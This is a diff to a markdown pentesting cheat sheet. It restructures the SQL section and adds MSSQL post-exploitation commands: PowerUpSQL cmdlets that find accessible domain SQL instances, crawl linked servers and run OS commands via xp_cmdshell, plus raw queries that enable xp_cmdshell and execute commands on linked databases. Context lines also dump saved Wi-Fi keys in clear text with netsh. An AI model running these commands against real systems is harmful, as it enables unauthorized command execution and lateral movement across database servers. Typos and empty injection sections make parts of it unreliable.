@@ -183,12 +183,13 @@ netsh wlan show porfile
 netsh wlan show porfile {WIFI NAME} key=clear
 ```
 
-## MySQL
-### Usage
+## SQL
+### MYSQL
+#### Usage
 ```
 mysql -u {usernmae} -p {password} -h {IP}
 ```
-### MySQL commands
+#### MySQL commands
 ```
 # show all databases
 show databases;
@@ -221,11 +222,55 @@ RECONFIGURE
 EXEC sp_configure 'xp_cmdshell', 1
 RECONFIGURE
 ```
-### SQL Bypass Authentication
+#### MySQL Bypass Authentication
 ```
 ```
-### SQL injection
+#### MySQL injection
 ```
+```
+### MSSQL
+#### PowerUpSQL
+```
+# Find domain accounts that have SQL access
+Get-SQLInstanceDomain
+
+# Check availability / Access
+Get-SQLConnectionTestThreaded
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
+
+# Gather Information e.g., which SQL serivce the user has access to
+Get-SQLInstanceDomain | Get-SQLServerInfo -verbose
+
+# Find links between serverrs
+Get-SQLServerLink -Instance {server} -Verbose
+
+# Enmuerating Database links
+Get-SQLServerLinkCrawl Instance {server} -verbose
+Get-SQLServerLinkCrawl -Instance '{computer}' -Query 'select @@version' | select Instance, CustomQuery | % { $_ | Add-Member NoteProperty 'QueryResult' $($_.CustomQuery[0]); $_ } | fl
+
+# Executing commands
+Get-SQLServerLinkCrawl -Instance {computer} -Query "exec master..xp_cmdshell 'whoami'" 
+```
+#### Queries
+```
+# useful commands
+SELECT @@version
+SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'
+EXEC xp_cmdshell 'dir C:\
+
+# Enable xp_cmdshell
+sp_configure 'Show Advanced Options', 1; RECONFIGURE;
+sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+
+# Discover linked databases
+SELECT * FROM master..sysservers
+
+# Executing commands / queires on linked databases
+EXEC('xp_cmdshell "dir C:\"') AT [{linked database}]
+SELECT * FROM OPENQUERY("{linked database}", 'select @@servername; exec xp_cmdshell ''whoami''')
+
+# Search for specific keywords in the database and format results in a table
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ? { $_.Status -eq 'Accessible' } | Get-SQLColumnSampleDataThreaded -SampleSize 5 -Keywords 'student,name' -NoDefaults | select instance, database, column, sample | ft -autosize
 ```
 
 ## Networking
